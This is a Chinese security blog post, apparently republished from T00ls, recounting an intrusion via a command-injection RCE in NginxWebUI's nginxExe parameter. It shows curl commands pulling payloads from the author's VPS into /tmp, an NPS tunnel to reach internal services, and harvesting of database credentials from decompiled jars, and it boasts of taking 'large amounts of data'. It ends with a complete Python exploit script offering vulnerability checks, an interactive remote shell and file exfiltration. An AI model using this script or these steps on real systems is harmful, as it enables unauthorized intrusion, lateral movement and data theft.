---
title: 记一次NginxWebUI 引发的渗透
url: https://mp.weixin.qq.com/s?__biz=Mzg3NzYzODU5NQ==&mid=2247484694&idx=1&sn=203c36c98486733f00de4277b34f3342&chksm=cf1ea3baf8692aac6905e53a7518a4ce9b8558f9a0408206a87cdad20033494180736acafca0&scene=58&subscene=0#rd
source: T00ls安全
date: 2024-07-30
fetch_date: 2025-10-06T17:46:59.284354
---

# 记一次NginxWebUI 引发的渗透

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/xkB4mPD62nPjvYwSGyT9heeuj2zMR64odDUFHd7dnz5ib8iaUYDcpgFWIueiaPtwp7ia2JCj3XKXyUDTjVccSRF1jw/0?wx_fmt=jpeg)

# 记一次NginxWebUI 引发的渗透

原创

shadowwolf

T00ls安全

# 0x01 起源

在某项目中遇到了`nginxWebUI`

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oQblKs8NtazZ4RpibrsB4hfpRyqcZXg5cRhWsmwib4Sdqt3eW52nTbb3w/640?wx_fmt=png&from=appmsg)

因为我依稀记得有几个rce的洞 所以试了试之前的payload

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oBQ6tWN6ZeYCXhTjAlFxxiaicE4RkexlW4iacmWL7mwPEGml0rDrRKa3gQ/640?wx_fmt=png&from=appmsg)

结果: 发现有rce

但是burp里面的回显排版太烂了 就写了个python 优化一下这个过程 让结果方便观测一点 如下图

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64owfLA2xHAUeb02e1J3Pu8lJoRJJWNiaAEmEFyib2PnaMFpcia7NFHGQwVQ/640?wx_fmt=png&from=appmsg)

`意外`

但是不知道怎么回事 用bash 弹shell就不成功 我感觉可能是`nginxWebUI`命令拼接的时候导致的奇奇怪怪的问题

如下图

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64o9wQhqaUgTjibd8KF0u4HU4n6WutgH1DyVMuYusevue2SPchJmYAmgUw/640?wx_fmt=png&from=appmsg)

# 0x02 NPS 先行

现在是想先传一个`nps`上去 这样对后面如果有仅限localhost的服务可以更方便摸 也可以更好的和队友协同这样

看看能不能用`curl` 远程读到我的文件之后直接 写入`/tmp`本地

## python接力 curl 实现下载

这里刚好有python环境 本来的想法是想用python来弹shell的 但是我vps监听了以后就跳了一行

```
x.x.x.x inverse host lookup failed: Unknown host
```

就没后续了,也没有继续有`交互`的总之就是没弹成功shell

于是就准备用python来实现`下载文件`(比如`c2/nps/fscan`), 然后`执行任务`

但是直接执行

```
curl x.x.x.x/xxx > /tmp/x
```

在服务器上放一个1.py 然后启动python3 -m http.server

方便我们的目标下载

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64o2Ogn6Lt6qgqs0iceDWico9ZtoUt70ibHlPxXNxSl2QLJmTbanwFO5JUQQ/640?wx_fmt=png&from=appmsg)

`意外`

但是直接curl不能执行

如图

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oSnhAQK9icrHEiaPBbCmVufv3hGbCLg0lvmaHcQvZziabkdSLe1h0ggPKg/640?wx_fmt=png&from=appmsg)

`tips`

于是用如下方法分多次写入

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oR8iboEkJ10ZFYIwRaVFdr8sILvGJNp32O9YsJduHUwmrticefz5ClmvQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64ofJgUawDnM6AnmCsGmD1ovicJNf7VmA6NzpOplt2bBzf49H24sD6h8sQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oWQqLCrVCE5XHpZ292maVoqtic2h4l4FB4zF0dDl3xeHkFehQeg2h6ibw/640?wx_fmt=png&from=appmsg)

这样就会执行

```
curl x.x.x.x/1.py >/tmp/x.py
```

## 完成NPS下载 && 运行

我们接着在靶机上执行 `python3 /tmp/x.py`

vps上弹出这个就说明下载任务开始了。

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64o2juLpI1HnvKKeUibcLIOSodbGWqF82XoQ8qS404V81Fed3icbOkRCYHA/640?wx_fmt=png&from=appmsg)

下载完成以后 `/tmp`目录会出现client.tar.gz这个文件,这个文件是我的`nps` 客户端 准备到时候打一些`localhost`的服务用的,虽然这个是云主机,但是`redis,mongodb`什么的不一定会少,还有`nacos`什么的 都是仅`localhost`的外网不可访问。

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oom9miakSeR5dcFcT74vXftTRDRUajGf1HP2MQTfWKtia43GHAA1A8tbw/640?wx_fmt=png&from=appmsg)

然后这样就可以用nps代理上去了

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64oK7iakYTCeASpjj4bUJmDtgpjmmo8SAjCKgGEiag5mlmhGA25lhpVzrNg/640?wx_fmt=png&from=appmsg)

# 0x03 更进一步 JAR 下载&&反编译寻找数据库连接

## 摸敏感文件 / 信息收集

`敏感文件`

`cat .bash_history`看了一下 都是几个jar包的启动命令 本地没有别的application.properities这种`conf配置`

还有`redis`的启动命令

我就准备把`jar`下载下来`反编译`一下 希望能看见`jdbc`这些的配置

其他

`netstat -tunlp` 看了一下 redis占用7777 还有一个8848 应该是`nacos`

## 下载敏感文件

现在主要的就是download下`jar`包文件 反编译找连接配置

只要用脚本执行`base64` 文件绝对路径 然后把输出重定向自己电脑上的其他文件就可以实现下载了。

> 听着有点繁琐 我已经写好脚本放在后面了

`tips`:反编译decompile报了版本不对

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64o2fGb38rABwrcpBPnvyuRsGI4k2pdknqYyM5YrefeSqMiaUWv0ibngapA/640?wx_fmt=png&from=appmsg)

修改版本就行了

```
49 =Java5
50=Java6
51=Java7
52=Java8
53=Java9
54=Java10
55=Java11
56=Java12
57=Java13
58=Java14
59=Java15
60=Java16
61=Java 17
```

## JAR反编译后寻找配置文件

修改到匹配版本后

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64o49VD4G5bg6DkhOG37yibIlIgNAzamk4iagOpicUf1ClzC84sk1iazEawiaQ/640?wx_fmt=png&from=appmsg)

看见久违的`jdbc://mysql`了

但是看着这个Inner感觉有点不对 感觉是内网 ，ping一下

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64ojJcDLN90mZLs7GnNPbEkibmvubKl3lJ8iabbY0QoKibLxsNPYmlA3MaHA/640?wx_fmt=png&from=appmsg)

果真内网

`nps`现在终于用上了

最后拿下`大量数据` , `本地nacos` , `本地redis` , `远程数据库`若干

附上成功连接图一张

![](https://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nPjvYwSGyT9heeuj2zMR64otkuys7oWe095jcqV2twLC0cib7eYtocT8cF1icxwQQAUKwZMDMJKHowA/640?wx_fmt=png&from=appmsg)

# 0x04 NginxWebUI nginxExe 处rce 检测脚本&& 利用脚本

```
import requests
import re
import sys
import base64
def helper():
print("----------helper--------------")
print(f"python3 {sys.argv[0]} poc http://example.com/AdminPage/conf/check ")
print(f"python3 {sys.argv[0]} exp http://example.com <command>")
print(f"python3 {sys.argv[0]} download http://example.com <file_absoult_path>")
def exp(url,command):
    req=requests.post(url,headers={
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Accept-Encoding":"gzip, deflate",
"Host": getHost(url),
"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
"Connection":"close"
},
    data={
"json":'''{"nginxContent":"TES","subContent":["A"],"subName":["A"]}''',
"nginxPath":"/tmp",
"nginxExe":f'''bash -c "echo <result> $({command}) </result>" |'''
}
#,proxies={"http":"http://127.0.0.1:8080"}
)
#   print(req.text)
    try:
print("[+]success\n"+re.compile("echo <result> (.*?)</result>").findall(req.text)[1].replace("<br>","\r\n"))
    except:
print("[-] failed")
def getHost(url):
return(url+"/").split("/")[2]
def download(url, document):
print(url,document)
    filename=document.replace('\\','/').split('/')[-1]
command=f"base64 {document}"
    req=requests.post(url,headers={
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Accept-Encoding":"gzip, deflate",
"Host": getHost(url),
"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
"Connection":"close"
},
    data={
"json":'''{"nginxContent":"TES","subContent":["A"],"subName":["A"]}''',
"nginxPath":"/tmp",
"nginxExe":f'''bash -c "echo <result> $({command}) </result>" |'''
}
#,proxies={"http":"http://127.0.0.1:8080"}
)
    try:
        result=re.compile("echo <result> (.*?)</result>").findall(req.text)[1].replace("<br>","\r\n")
print(f"[+]Dwonload {document} Success [Len:{len(result)}]")
        with open(filename,"wb")as f:
            f.write(base64.b64decode(result))
    except:
print("[-] Download Failed")
def poc(url):
    req=requests.post(url,headers={
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Accept-Encoding":"gzip, deflate",
"Host": getHost(url),
"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
"Connection":"close"
},
    data={
"json":'''{"nginxContent":"TES","subContent":["A"],"subName":["A"]}''',
"nginxPath":"/tmp",
"nginxExe":f'''bash -c "echo <result> $(echo 'success') </result>" |'''
}
#,proxies={"http":"http://127.0.0.1:8080"}
)
#print(req.text)
    try:
        result=re.compile("echo <result> (.*?)</result>").findall(req.text)[1].replace("<br>","\r\n")
if"success"in result:
print("[+] Vuln! {}".format(url))
else:
print("[-] Not Vuln")
    except:
print("[-] Not Vuln")

if __name__=="__main__":
if len(sys.argv)>2:
if len(sys.argv)==3 and sys.argv[1]=="poc":
            poc(sys.argv[2])
if len(sys.argv)==3 and sys.argv[1]=="exp":
whileTrue:
command=input(">>> ")
                exp(sys.argv[2],command)
if len(sys.argv)==4 and sys.argv[1]=="download":
            download(sys.argv[2],sys.argv[3])
else:
        helper()
```

## 原文链接

> https://www.t00ls.com/articles-71823.html

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nOAjMAKC6icupJMRh71NoyhUB3efic74ESDrBtMlicTvhR5rAJAbiaXxPahyUibJnpbHibNUhtkK5PCUzFQ/0?wx_fmt=png)

T00ls安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/xkB4mPD62nOAjMAKC6i...